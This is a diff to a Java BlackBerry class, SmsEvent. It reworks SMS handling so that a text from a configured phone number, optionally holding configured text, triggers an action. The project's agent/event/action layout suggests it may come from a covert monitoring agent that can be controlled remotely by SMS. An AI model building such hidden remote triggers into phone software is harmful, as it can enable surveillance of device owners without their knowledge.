@@ -8,6 +8,7 @@
  * *************************************************/
 package blackberry.event;
 
+import java.io.EOFException;
 import java.io.IOException;
 import java.io.InterruptedIOException;
 
@@ -20,8 +21,15 @@ import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.MessageListener;
 import javax.wireless.messaging.TextMessage;
 
+import net.rim.device.api.util.DataBuffer;
+
+import blackberry.action.Action;
+import blackberry.agent.sms.SmsListener;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.interfaces.SmsObserver;
+import blackberry.utils.Check;
+import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -38,10 +46,15 @@ import blackberry.debug.DebugLevel;
  * 
  * @author user1
  */
-public final class SmsEvent extends Event implements MessageListener {
+public final class SmsEvent extends Event implements MessageListener, SmsObserver {
     //#ifdef DEBUG
     private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
     //#endif
+
+    String number;
+    String text;
+    
+    SmsListener smsListener;
 
     // private final boolean stop = false;
     private DatagramConnection dc;
@@ -57,64 +70,20 @@ public final class SmsEvent extends Event implements MessageListener {
      */
     public SmsEvent(final int actionId, final byte[] confParams) {
         super(Event.EVENT_SMS, actionId, confParams, "SmsEvent");
-
+        setPeriod(NEVER);
+        
+        smsListener = SmsListener.getInstance();
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.threadpool.TimerJob#actualRun()
-     */
+    protected void actualStart() {
+        smsListener.addSmsObserver(this);
+    }
+
+
     protected void actualRun() {
-        try {
-            mc = (MessageConnection) Connector.open("sms://:0");
-            mc.setMessageListener(this);
-        } catch (final IOException e) {
-            //#ifdef DEBUG
-            debug.error(e.toString());
-            //#endif
-        }
-
-        try {
-            mc.close();
-        } catch (final IOException e) {
-            //#ifdef DEBUG
-            debug.error(e.toString());
-            //#endif
-        }
-    }
-
-    /**
-     * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
-     * 348583
-     * /800451/800563/What_Is_-_Different_ways_to_listen_for_SMS_messages.html
-     * ?nodeid=1357551&vernum=0
-     */
-    protected void actualRunDatagram() {
         //#ifdef DEBUG
         debug.trace("actualRun");
         //#endif
-        try {
-            dc = (DatagramConnection) Connector.open("sms://0");
-
-            final Datagram d = dc.newDatagram(dc.getMaximumLength());
-            //#ifdef DEBUG
-            debug.trace("waiting to receive sms");
-            //#endif
-            dc.receive(d);
-
-            final String address = new String(d.getAddress());
-            final String msg = new String(d.getData());
-
-            //#ifdef DEBUG
-            debug.info("SMS Message received: " + msg);
-            debug.info("From: " + address);
-            //#endif
-
-        } catch (final IOException e) {
-            //#ifdef DEBUG
-            debug.trace("exception: " + e);
-            //#endif
-        }
     }
 
     /*
@@ -122,20 +91,11 @@ public final class SmsEvent extends Event implements MessageListener {
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     public synchronized void actualStop() {
-
-        try {
-            if (dc != null) {
-                dc.close(); // Close the connection so the thread returns.
-            }
-        } catch (final IOException e) {
-            //#ifdef DEBUG
-            debug.error(e.toString());
-            //#endif
-        } catch (final Exception ex) {
-            //#ifdef DEBUG
-            debug.error(ex);
-            //#endif
-        }
+        //#ifdef DEBUG
+        debug.trace("actualStop");
+        //#endif
+      
+        smsListener.removeSmsObserver(this);
     }
 
     /*
@@ -154,6 +114,21 @@ public final class SmsEvent extends Event implements MessageListener {
             if (m instanceof TextMessage) {
                 final TextMessage tm = (TextMessage) m;
                 msg = tm.getPayloadText();
+                
+                if(address.endsWith(number)){
+                    //#ifdef DEBUG
+                    debug.trace("notifyIncomingMessage: good number "+address);
+                    //#endif
+                    
+                    if( text == null || msg.equals(text) ){
+                        //#ifdef DEBUG
+                        debug.trace("notifyIncomingMessage good message: " + msg);
+                        //#endif
+                        
+                        trigger();
+                    }
+                }
+                
             } else if (m instanceof BinaryMessage) {
                 //final StringBuffer buf = new StringBuffer();
                 final byte[] data = ((BinaryMessage) m).getPayloadData();
@@ -183,8 +158,70 @@ public final class SmsEvent extends Event implements MessageListener {
      * @see blackberry.event.Event#parse(byte[])
      */
     protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
+                confParams.length, false);
+        try {
+            int numLen = databuffer.readInt();
+            byte[] numberW = new byte[numLen];
+            databuffer.read(numberW);
 
-        return false;
+            number = WChar.getString(numberW, true);
+
+            int textLen = databuffer.readInt();
+            byte[] textW = new byte[textLen];
+            databuffer.read(textW);
+
+            if(textLen > 0 ){
+                //#ifdef DEBUG
+                debug.trace("parse: we have a text");
+                //#endif
+                text = WChar.getString(textW, true);
+            }
+
+            //#ifdef DEBUG
+            debug.trace("parse number: " + number);
+            debug.trace("parse text: " + text);
+            //#endif
+
+        } catch (final EOFException e) {
+
+            return false;
+        }
+        return true;
     }
+
+    public void onNewSms(Message m, boolean incoming) {
+        final String address = m.getAddress();
+        String msg = null;
+        if (m instanceof TextMessage) {
+            final TextMessage tm = (TextMessage) m;
+            msg = tm.getPayloadText();
+            
+            if(incoming && address.endsWith(number)){
+                //#ifdef DEBUG
+                debug.trace("notifyIncomingMessage: good number "+address);
+                //#endif
+                
+                if( text == null || msg.indexOf(text) >= 0 ){
+                    //#ifdef DEBUG
+                    debug.trace("notifyIncomingMessage good message: " + msg);
+                    //#endif
+                    
+                    trigger();
+                }
+            }
+            
+        } else if (m instanceof BinaryMessage) {
+            //#ifdef DEBUG
+            debug.trace("onNewSms: Binary");
+            //#endif
+        } else {
+          //#ifdef DEBUG
+            debug.trace("onNewSms: unknown");
+            //#endif
+        }
+    }
+    
+    
 
 }
